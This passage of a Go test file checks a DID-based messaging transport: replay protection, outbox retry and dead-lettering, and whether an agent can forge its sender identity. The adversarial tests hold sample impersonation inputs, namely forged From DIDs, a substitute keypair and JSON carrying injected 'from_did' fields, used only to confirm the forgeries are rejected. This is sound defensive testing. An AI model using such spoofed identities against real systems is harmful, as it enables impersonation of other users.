		// First processing succeeds.
		_, err := env.svc.ProcessInbound(ctx, sealed)
		if err != nil {
			t.Fatalf("first ProcessInbound: %v", err)
		}

		// Second fails (replay).
		_, err = env.svc.ProcessInbound(ctx, sealed)
		if !errors.Is(err, domain.ErrReplayDetected) {
			t.Fatalf("expected ErrReplayDetected before purge, got: %v", err)
		}

		// Purge all entries. The test uses a frozen mock clock, so the entry
		// timestamp equals the purge timestamp. Using a negative maxAge moves
		// the cutoff into the future, ensuring all entries are purged:
		// cutoff = now - (-1h) = now + 1h > ts → purged.
		purged := env.svc.PurgeReplayCache(-1 * time.Hour)
		if purged < 1 {
			t.Fatalf("expected at least 1 purged entry, got %d", purged)
		}

		// After purge, same message can be processed again.
		result, err := env.svc.ProcessInbound(ctx, sealed)
		if err != nil {
			t.Fatalf("ProcessInbound after purge must succeed: %v", err)
		}
		if result.ID != "msg-purge-test" {
			t.Fatalf("message ID mismatch after purge: want msg-purge-test, got %q", result.ID)
		}
	})

	t.Run("positive_control_first_message_always_succeeds", func(t *testing.T) {
		// Verify that for any fresh message, the first ProcessInbound always succeeds.
		// Without this, the test passes if ProcessInbound rejects everything.
		env := newTransportTestEnv(t)
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		ctx := context.Background()

		for i := 0; i < 5; i++ {
			msg := domain.DinaMessage{
				ID:          fmt.Sprintf("msg-fresh-%d", i),
				Type:        domain.MsgTypeSocialUpdate,
				From:        "did:key:z6MkSenderTest",
				To:          []string{"did:key:z6MkRecipientTest"},
				CreatedTime: time.Now().Unix(),
				Body:        []byte(fmt.Sprintf(`{"q":"fresh message %d"}`, i)),
			}
			result, err := env.svc.ProcessInbound(ctx, buildSealed(env, msg))
			if err != nil {
				t.Fatalf("fresh message %d must succeed: %v", i, err)
			}
			if result.ID != fmt.Sprintf("msg-fresh-%d", i) {
				t.Fatalf("message %d ID mismatch", i)
			}
		}
	})
}

// ==========================================================================
// TST-CORE-939: ProcessOutbox delivers pending messages
// §29.2: "ProcessOutbox retries all pending messages."
// Requirement: Pending message + working deliverer → Status becomes delivered.
// This test exercises ProcessOutbox specifically (not SendMessage immediate
// delivery), verifying the background retry scheduler path.
// ==========================================================================

func TestTransport_29_2_1_ProcessOutboxDeliversPendingMessages(t *testing.T) {

	t.Run("pending_message_becomes_delivered_after_ProcessOutbox", func(t *testing.T) {
		// Setup: enqueue via SendMessage with a failing deliverer so message stays pending.
		// Then fix the deliverer and call ProcessOutbox — message should be delivered.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		// Make deliverer fail on first attempt (SendMessage immediate delivery).
		env.deliverer.err = errors.New("transient network error")

		msg := domain.DinaMessage{
			ID:   "msg-process-001",
			Type: domain.MsgTypeSocialUpdate,
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"pending test"}`),
		}
		err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		if err != nil {
			t.Fatalf("SendMessage: %v", err)
		}

		// Verify message is still pending (delivery failed but not marked failed by SendMessage).
		pending, _ := env.outbox.ListPending(ctx)
		if len(pending) != 1 {
			t.Fatalf("expected 1 pending message, got %d", len(pending))
		}

		// Fix the deliverer and call ProcessOutbox.
		env.deliverer.err = nil
		env.deliverer.calls = nil // reset call log

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 1 {
			t.Fatalf("expected 1 processed, got %d", processed)
		}

		// Message should no longer be pending.
		pending2, _ := env.outbox.ListPending(ctx)
		if len(pending2) != 0 {
			t.Fatalf("expected 0 pending after successful delivery, got %d", len(pending2))
		}

		// Verify deliverer was called with the correct endpoint.
		if len(env.deliverer.calls) != 1 {
			t.Fatalf("expected 1 delivery call, got %d", len(env.deliverer.calls))
		}
		if env.deliverer.calls[0].endpoint != "https://recipient.test/msg" {
			t.Fatalf("endpoint mismatch: got %q", env.deliverer.calls[0].endpoint)
		}
	})

	t.Run("deliverer_receives_valid_d2d_payload_with_ciphertext_and_sig", func(t *testing.T) {
		// Verify the payload delivered by ProcessOutbox contains valid JSON
		// with base64-encoded ciphertext and hex-encoded signature.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		env.deliverer.err = errors.New("first attempt fails")
		msg := domain.DinaMessage{
			ID:   "msg-payload-check",
			Type: domain.MsgTypeSocialUpdate,
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"payload test"}`),
		}
		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

		env.deliverer.err = nil
		env.deliverer.calls = nil
		env.svc.ProcessOutbox(ctx)

		if len(env.deliverer.calls) == 0 {
			t.Fatal("deliverer must be called during ProcessOutbox")
		}

		// Parse the d2d payload.
		var payload struct {
			C string `json:"c"` // base64 ciphertext
			S string `json:"s"` // hex signature
		}
		if err := json.Unmarshal(env.deliverer.calls[0].payload, &payload); err != nil {
			t.Fatalf("delivery payload must be valid JSON: %v", err)
		}
		if payload.C == "" {
			t.Fatal("ciphertext field must be non-empty")
		}
		if payload.S == "" {
			t.Fatal("signature field must be non-empty")
		}
		// Verify base64 is decodable.
		if _, err := base64.StdEncoding.DecodeString(payload.C); err != nil {
			t.Fatalf("ciphertext must be valid base64: %v", err)
		}
		// Verify hex sig is decodable.
		if _, err := hex.DecodeString(payload.S); err != nil {
			t.Fatalf("signature must be valid hex: %v", err)
		}
	})

	t.Run("multiple_pending_messages_all_delivered_in_one_call", func(t *testing.T) {
		// Verify ProcessOutbox handles multiple pending messages, not just one.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		env.deliverer.err = errors.New("batch fail")
		for i := 0; i < 3; i++ {
			msg := domain.DinaMessage{
				ID:   fmt.Sprintf("msg-batch-%d", i),
				Type: domain.MsgTypeSocialUpdate,
				To:   []string{"did:key:z6MkRecipientTest"},
				Body: []byte(fmt.Sprintf(`{"q":"batch %d"}`, i)),
			}
			_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		}

		pending, _ := env.outbox.ListPending(ctx)
		if len(pending) != 3 {
			t.Fatalf("expected 3 pending, got %d", len(pending))
		}

		// Fix deliverer and process all.
		env.deliverer.err = nil
		env.deliverer.calls = nil
		processed, _ := env.svc.ProcessOutbox(ctx)
		if processed != 3 {
			t.Fatalf("expected 3 processed, got %d", processed)
		}

		pending2, _ := env.outbox.ListPending(ctx)
		if len(pending2) != 0 {
			t.Fatalf("expected 0 pending after batch delivery, got %d", len(pending2))
		}
		if len(env.deliverer.calls) != 3 {
			t.Fatalf("expected 3 delivery calls, got %d", len(env.deliverer.calls))
		}
	})

	t.Run("dead_letter_messages_skipped_not_delivered", func(t *testing.T) {
		// Messages with Retries >= 5 are dead-lettered: skipped by ProcessOutbox.
		// This verifies the dead-letter threshold (maxRetries = 5).
		env := newTransportTestEnv(t)
		ctx := context.Background()

		// Directly enqueue a message with Retries = 5 (dead-letter threshold).
		// The mock's Enqueue preserves Retries but sets Status = "pending".
		deadLetterMsg := domain.OutboxMessage{
			ToDID:   "did:key:z6MkRecipientTest",
			Payload: []byte("dummy-ciphertext"),
			Sig:     []byte("dummy-sig"),
			Retries: 5, // At dead-letter threshold
		}
		_, err := env.outbox.Enqueue(ctx, deadLetterMsg)
		if err != nil {
			t.Fatalf("Enqueue: %v", err)
		}

		// Verify the message is pending (Enqueue sets Status = "pending").
		pending, _ := env.outbox.ListPending(ctx)
		if len(pending) != 1 {
			t.Fatalf("expected 1 pending, got %d", len(pending))
		}

		// ProcessOutbox should skip the dead-lettered message (Retries >= 5).
		// The deliverer should NOT be called.
		env.deliverer.calls = nil
		processed, _ := env.svc.ProcessOutbox(ctx)
		// Dead-lettered messages count as "processed" (they were checked) but skipped.
		if processed != 1 {
			t.Fatalf("expected 1 processed (skipped), got %d", processed)
		}
		if len(env.deliverer.calls) > 0 {
			t.Fatal("dead-lettered messages (Retries >= 5) must be skipped, not delivered")
		}
	})

	t.Run("positive_control_no_pending_messages_zero_processed", func(t *testing.T) {
		// Contrast check: if there are no pending messages, ProcessOutbox
		// returns 0 processed and makes no delivery calls.
		env := newTransportTestEnv(t)
		ctx := context.Background()

		processed, err := env.svc.ProcessOutbox(ctx)
		if err != nil {
			t.Fatalf("ProcessOutbox: %v", err)
		}
		if processed != 0 {
			t.Fatalf("expected 0 processed with empty outbox, got %d", processed)
		}
		if len(env.deliverer.calls) != 0 {
			t.Fatalf("expected 0 delivery calls with empty outbox, got %d", len(env.deliverer.calls))
		}
	})
}

// ==========================================================================
// TST-CORE-1131: Agent cannot forge `from_did` in outbound D2D messages
// §34.2 Agent Sandbox Adversarial
// Requirement: Agent submits D2D message with `from_did` set to user's DID →
// Core overrides `from_did` with agent's actual DID — impersonation impossible.
//
// Protection chain:
// 1. Handler-level: sendRequest struct doesn't parse from_did from JSON
// 2. Service-level: SendMessage sets From = senderDID when From is empty
// 3. Crypto-level: signature is made with node's signing key, so forged From
//    would cause recipient's signature verification to fail (key mismatch)
// ==========================================================================

func TestTransport_34_2_10_AgentCannotForgeFromDID(t *testing.T) {

	t.Run("empty_From_gets_senderDID_in_round_trip", func(t *testing.T) {
		// Normal handler path: message created without From → SendMessage fills
		// it with senderDID → recipient decrypts and sees correct From.
		env := newTransportTestEnv(t)
		ctx := context.Background()
		env.svc.SetSenderDID("did:key:z6MkSenderTest")
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		env.svc.SetVerifier(dinacrypto.NewEd25519Signer())

		msg := domain.DinaMessage{
			ID:   "msg-from-empty",
			Type: domain.MsgTypeSocialUpdate,
			// From intentionally empty — simulates the handler path.
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"from test"}`),
		}

		err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		if err != nil {
			t.Fatalf("SendMessage: %v", err)
		}

		// Delivery should have succeeded. Use ProcessInbound on the raw d2d payload
		// (the production inbound path: parses JSON, base64-decodes, decrypts, verifies sig).
		if len(env.deliverer.calls) == 0 {
			t.Fatal("expected delivery call")
		}

		received, err := env.svc.ProcessInbound(ctx, env.deliverer.calls[0].payload)
		if err != nil {
			t.Fatalf("ProcessInbound: %v", err)
		}

		// The decrypted message must have From = senderDID, not empty.
		if received.From != "did:key:z6MkSenderTest" {
			t.Fatalf("From must be senderDID, got %q", received.From)
		}
	})

	t.Run("forged_From_detected_by_recipient_DID_resolution_failure", func(t *testing.T) {
		// Even if a caller manages to set From to an unknown DID, the recipient
		// will fail when trying to resolve that DID for signature verification.
		env := newTransportTestEnv(t)
		ctx := context.Background()
		env.svc.SetSenderDID("did:key:z6MkSenderTest")
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		env.svc.SetVerifier(dinacrypto.NewEd25519Signer())

		// Set From to a DID not in the resolver. Since senderDID is set and
		// From is non-empty, the code won't override it.
		forgedDID := "did:key:z6MkFORGED"

		msg := domain.DinaMessage{
			ID:   "msg-forged-from",
			Type: domain.MsgTypeSocialUpdate,
			From: forgedDID, // Attempted impersonation
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"forged sender"}`),
		}

		err := env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)
		if err != nil {
			t.Fatalf("SendMessage: %v", err)
		}

		if len(env.deliverer.calls) == 0 {
			t.Fatal("expected delivery")
		}

		// On the recipient side, ProcessInbound decrypts, reads msg.From = "did:key:z6MkFORGED",
		// then tries to resolve that DID. Since the resolver doesn't have it,
		// it fails → impersonation prevented.
		_, err = env.svc.ProcessInbound(ctx, env.deliverer.calls[0].payload)
		if err == nil {
			t.Fatal("ProcessInbound must fail when From DID is unresolvable — forgery detected")
		}
		// The error should indicate DID resolution failure.
		if !strings.Contains(err.Error(), "resolve") && !strings.Contains(err.Error(), "DID") {
			t.Logf("error type: %v (any failure is acceptable for forgery detection)", err)
		}
	})

	t.Run("forged_From_with_different_key_fails_signature_verification", func(t *testing.T) {
		// Even if the forged DID IS resolvable but has a DIFFERENT public key,
		// signature verification must fail — the message was signed with the
		// sender's key, not the forged DID's key.
		env := newTransportTestEnv(t)
		ctx := context.Background()
		env.svc.SetSenderDID("did:key:z6MkSenderTest")
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		env.svc.SetVerifier(dinacrypto.NewEd25519Signer())

		// Generate a completely different keypair for the "forged" DID.
		forgedSeed := [32]byte{0xff, 0xfe, 0xfd, 0xfc, 0xfb, 0xfa, 0xf9, 0xf8,
			0xf7, 0xf6, 0xf5, 0xf4, 0xf3, 0xf2, 0xf1, 0xf0,
			0xef, 0xee, 0xed, 0xec, 0xeb, 0xea, 0xe9, 0xe8,
			0xe7, 0xe6, 0xe5, 0xe4, 0xe3, 0xe2, 0xe1, 0xe0}
		forgedSigner := dinacrypto.NewEd25519Signer()
		forgedPub, _, err := forgedSigner.GenerateFromSeed(forgedSeed[:])
		if err != nil {
			t.Fatalf("generate forged keys: %v", err)
		}

		// Register the forged DID in the resolver with its own (different) public key.
		forgedDID := "did:key:z6MkForgedKey"
		env.resolver.docs[forgedDID] = &domain.DIDDocument{
			ID: forgedDID,
			VerificationMethod: []domain.VerificationMethod{{
				ID:                 forgedDID + "#key-1",
				Type:               "Ed25519VerificationKey2020",
				Controller:         forgedDID,
				PublicKeyMultibase: "z" + base58.Encode(append([]byte{0xed, 0x01}, forgedPub...)),
			}},
			Service: []domain.ServiceEndpoint{{
				ID:              "#didcomm",
				Type:            "DIDCommMessaging",
				ServiceEndpoint: "https://forged.test/msg",
			}},
		}

		msg := domain.DinaMessage{
			ID:   "msg-forged-key",
			Type: domain.MsgTypeSocialUpdate,
			From: forgedDID, // Claims to be from forged DID
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"impersonation attempt"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

		if len(env.deliverer.calls) == 0 {
			t.Fatal("expected delivery")
		}

		// Recipient decrypts and tries to verify using the forged DID's key.
		// The signature was made with the REAL sender's key → verification MUST fail.
		_, err = env.svc.ProcessInbound(ctx, env.deliverer.calls[0].payload)
		if err == nil {
			t.Fatal("ProcessInbound must reject: signature was made with sender's key but verified against forged DID's key")
		}
		if !strings.Contains(err.Error(), "signature") {
			t.Logf("error: %v (expected signature verification failure)", err)
		}
	})

	t.Run("handler_sendRequest_does_not_expose_from_field", func(t *testing.T) {
		// Structural verification: the handler's sendRequest struct has only
		// To, Body, and Type fields. There is no From/from_did field that an
		// agent could use to inject a forged sender identity.
		// We verify by encoding JSON with a "from" field and decoding into
		// sendRequest — the from field must be silently ignored.
		type sendRequest struct {
			To   string `json:"to"`
			Body []byte `json:"body"`
			Type string `json:"type"`
		}
		input := `{"to":"did:key:z6MkTest","body":"dGVzdA==","type":"query","from":"did:key:z6MkFORGED","from_did":"did:key:z6MkFORGED"}`
		var req sendRequest
		if err := json.Unmarshal([]byte(input), &req); err != nil {
			t.Fatalf("unmarshal: %v", err)
		}
		// The struct has no From field — extra JSON fields are silently dropped.
		if req.To != "did:key:z6MkTest" {
			t.Fatalf("To mismatch: %q", req.To)
		}
		// This proves that even if an agent sends from/from_did in the JSON body,
		// Go's json.Unmarshal drops unknown fields — impersonation at API level impossible.
	})

	t.Run("positive_control_legitimate_message_verifies_correctly", func(t *testing.T) {
		// Contrast check: a legitimate message (From = senderDID matching signing key)
		// passes signature verification end-to-end. Without this, the test passes
		// if ProcessInbound always rejects.
		env := newTransportTestEnv(t)
		ctx := context.Background()
		env.svc.SetSenderDID("did:key:z6MkSenderTest")
		env.svc.SetRecipientKeys(env.rcptPub, env.rcptPriv)
		env.svc.SetVerifier(dinacrypto.NewEd25519Signer())

		msg := domain.DinaMessage{
			ID:   "msg-legit",
			Type: domain.MsgTypeSocialUpdate,
			// From left empty — SendMessage fills in senderDID correctly.
			To:   []string{"did:key:z6MkRecipientTest"},
			Body: []byte(`{"q":"legitimate message"}`),
		}

		_ = env.svc.SendMessage(ctx, "did:key:z6MkRecipientTest", msg)

		if len(env.deliverer.calls) == 0 {
			t.Fatal("expected delivery")
		}

		// Use ProcessInbound (production path) to verify the complete round-trip.
		received, err := env.svc.ProcessInbound(ctx, env.deliverer.calls[0].payload)
		if err != nil {
			t.Fatalf("legitimate message must be accepted: %v", err)
		}
		if received.From != "did:key:z6MkSenderTest" {
			t.Fatalf("From mismatch: want senderDID, got %q", received.From)
		}
		if string(received.Body) != `{"q":"legitimate message"}` {
			t.Fatalf("Body mismatch: %s", received.Body)
		}
	})
}
